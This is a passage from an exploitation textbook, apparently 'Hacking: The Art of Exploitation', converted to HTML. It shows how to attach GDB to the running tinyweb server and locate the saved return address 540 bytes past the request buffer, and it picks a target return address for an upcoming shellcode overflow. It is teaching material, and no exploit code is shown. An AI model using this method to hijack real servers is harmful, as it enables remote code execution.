<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x481 Analysis with GDB</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part108.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part110.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark98">0x481 Analysis with GDB</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">To exploit the vulnerability in the tinyweb.c program, we just need to send packets that will strategically overwrite the return address. First, we need to know the offset from the start of a buffer we control to the stored return address. Using GDB, we can analyze the compiled program to find this; however, there are some subtle details that can cause tricky problems. For example, the program requires root privileges, so the debugger must be run as root. But using <span class="s31">sudo </span>or running with root’s environment will change the stack, meaning the addresses seen in the debugger’s run of the binary won’t match the addresses when it’s running normally. There are other slight differences that can shift memory around in the debugger like this, creating inconsistencies that can be maddening to track down. According to the debugger, everything will look like it should work; however, the exploit fails when run outside the debugger, since the addresses are different.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">One elegant solution to this problem is to attach to the process after it’s already running. In the output below, GDB is used to attach to an already- running tinyweb process that was started in another terminal. The source is recompiled using the <span class="s31">-g </span>option to include debugging symbols that GDB can apply to the running process.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_811.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinyweb</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">13019 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1504</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">344 pts/0</p></td><td style="width:57pt"><p class="s42" style="padding-left: 9pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">S+  20:25</p></td><td style="width:81pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinyweb</p></td></tr><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">13104 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">748 pts/2</p></td><td style="width:57pt"><p class="s42" style="padding-left: 9pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+  20:27</p></td><td style="width:81pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinyweb</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinyweb.c reader@hacking:~/booksrc $ sudo gdb -q --pid=13019 --symbols=./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. Attaching to process 13019</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">/cow/home/reader/booksrc/tinyweb: No such file or directory. A program is being debugged already. Kill it? (y or n) n Program not killed.</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) bt</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#0 0xb7fe77f2 in ?? () #1 0xb7f691e1 in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#2 0x08048ccf in main () at tinyweb.c:44 (gdb) list 44</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">39    if (listen(sockfd, 20) == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">40      fatal(&quot;listening on socket&quot;); 41</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">42    while(1) {  // Accept loop</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">43       sin_size = sizeof(struct sockaddr_in);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">44      <b>new_sockfd = accept(sockfd, (struct sockaddr *)&amp;client_addr, &amp;sin_size);</b></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">45      if(new_sockfd == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">46       fatal(&quot;accepting connection&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">47</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">48     handle_connection(new_sockfd, &amp;client_addr); (gdb) list handle_connection</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">53   /* This function handles the connection on the passed socket from the</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">54    * passed client address.  The connection is processed as a web request</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">55    * and this function replies over the connected socket. Finally, the</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">56   * passed socket is closed at the end of the function.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">57   */</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">58   void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">59     unsigned char *ptr, request[500], resource[500];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">60    int fd, length; 61</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;"><span class="s31">62     </span>length = <span class="s73">0</span>recv_line(sockfd, request);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break 62</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x8048d02: file tinyweb.c, line 62. (gdb) cont</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Continuing.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_812.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">After attaching to the running process, a stack backtrace shows the pro- gram is currenty in <span class="s31">main()</span>, waiting for a connection. After setting a breakpoint at the first <span class="s31">recv_line() </span>call on line 62 (<span class="s95">0</span>), the program is allowed to continue. At this point, the program’s execution must be advanced by making a web request using <span class="s31">wget </span>in another terminal or a browser. Then the breakpoint in <span class="s31">handle_connection() </span>will be hit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_813.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 2, handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">62     length = recv_line(sockfd, request); (gdb) x/x request</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff5c0:  0x00000000 (gdb) bt</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#0  handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62 #1  0x08048cf6 in main () at tinyweb.c:48</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/16xw request+500</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">0xbffff7b4:   0xb7fd5ff4    0xb8000ce0    0x00000000    0xbffff848 0xbffff7c4:   0xb7ff9300    0xb7fd5ff4    0xbffff7e0    0xb7f691c0 0xbffff7d4:   0xb7fd5ff4    0xbffff848    0x08048cf6    0x00000004 0xbffff7e4:   0xbffff810    0xbffff80c    0xbffff834    0x00000004 (gdb) x/x 0xbffff7d4+8</p><p class="s75" style="padding-left: 19pt;text-indent: 0pt;text-align: justify;">@<span class="s31">0xbffff7dc:   0x08048cf6 (gdb) p 0xbffff7dc - 0xbffff5c0</span></p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 540</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p /x 0xbffff5c0 + 200</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$2 = 0xbffff688 (gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The program is running. Quit anyway (and detach it)? (y or n) y Detaching from program: , process 13019</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_814.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-top: 10pt;padding-left: 19pt;text-indent: 0pt;text-align: left;"><a name="bookmark99">tinyweb_exploit.c</a></p><p style="padding-top: 4pt;text-indent: 16pt;line-height: 107%;text-align: left;">At the breakpoint, the request buffer begins at <span class="s31">0xbfffff5c0</span>. The <span class="s31">bt </span>com- mand’s stack backtrace shows that the return address from <span class="s31">handle_connection() </span>is <span class="s31">0x08048cf6</span>. Since we know how the local variables are generally laid out on the stack, we know the request buffer is near the end of the frame. This means that the stored return address should be on the stack somewhere near the end of this 500-byte buffer. Since we already know the general area to look, a quick inspection shows the stored return address is at <span class="s31">0xbffff7dc </span>(<span class="s74">@</span>). A little math shows the stored return address is 540 bytes from the start of the request buffer. However, there are a few bytes near the beginning of the buffer that might be mangled by the rest of the function. Remember, we don’t gain control of the program until the function returns. To account for this, it’s best to just avoid the beginning of the buffer. Skipping the first 200 bytes should be safe, while leaving plenty of space for shellcode in the remaining 300 bytes. This means <span class="s31">0xbffff688 </span>is the target return address.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part108.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part110.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
